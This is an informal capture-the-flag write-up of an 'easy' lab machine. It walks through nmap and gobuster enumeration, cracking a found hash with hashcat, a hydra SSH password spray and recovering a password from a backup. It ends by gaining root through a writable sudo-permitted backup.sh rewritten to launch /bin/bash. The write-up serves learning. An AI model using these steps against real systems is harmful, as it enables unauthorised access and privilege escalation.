Quick port scan
```bash
nmap -p- -min-rate=10000 10.10.123.184
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-13 15:24 EEST
Warning: 10.10.123.184 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.123.184
Host is up (0.24s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
9308/tcp  filtered unknown
18511/tcp filtered unknown
20916/tcp filtered unknown
25612/tcp filtered unknown
41515/tcp filtered unknown
44026/tcp filtered unknown
57718/tcp filtered unknown
61427/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds
```
```bash
nmap -p 22,80 -sC -sV -A 10.10.123.184
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-13 15:25 EEST
Nmap scan report for 10.10.123.184
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   159.91 ms 10.6.0.1
2   ... 3
4   212.63 ms 10.10.123.184

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.42 seconds
```
Little bit of subdirectory enumerating
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.123.184/ -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.123.184/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.123.184/admin/]
/etc                  (Status: 301) [Size: 312] [--> http://10.10.123.184/etc/]
```
The etc file had the following inside of it "music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn."
And cracking it with hashcat
```bash
hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```
Ok we are a little bit stuck rn. But we have users Jack, Adam, Josh, Alex
I tried the pass on every acc but nothing came up
```bash
hydra -L users -p squidward ssh://10.10.123.184 -V

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-13 16:10:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.10.123.184:22/
[ATTEMPT] target 10.10.123.184 - login "jack" - pass "squidward" - 1 of 5 [child 0] (0/0)
[ATTEMPT] target 10.10.123.184 - login "adam" - pass "squidward" - 2 of 5 [child 1] (0/0)
[ATTEMPT] target 10.10.123.184 - login "josh" - pass "squidward" - 3 of 5 [child 2] (0/0)
[ATTEMPT] target 10.10.123.184 - login "alex" - pass "squidward" - 4 of 5 [child 3] (0/0)
[ATTEMPT] target 10.10.123.184 - login "music_arcive" - pass "squidward" - 5 of 5 [child 4] (0/0)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-13 16:10:13
```
Ok we were able to download an archive.tar folder from their site and it revealed that they use borgbackup. There we were able to extract the folder of the account we were able to break earlier with hashcat
```bash
┌──(kali㉿kali)-[~/…/dev/home/alex/Documents]
└─$ cat note.txt 
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```
We were able to make a ssh connection and get the user.txt file Then we'll look for ways to PrivEsc
```bash
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
Im guessing we can use the backup.sh to make a backup of the root folder BUT that's just an early guess since its an "easy" rated machine
I was able to change the backup.sh into a writeable with chmod +w backup.sh since it was an application in my name
I decided it was just easy to empty the script and make it just print out the insides of /root/root.txt
```bash
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh 
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
I feel like i cheesed it a bit so i decided to actually escalate my priviledges.
And it was just as simple as making the script /bin/bash and now we have a root shell
easy.
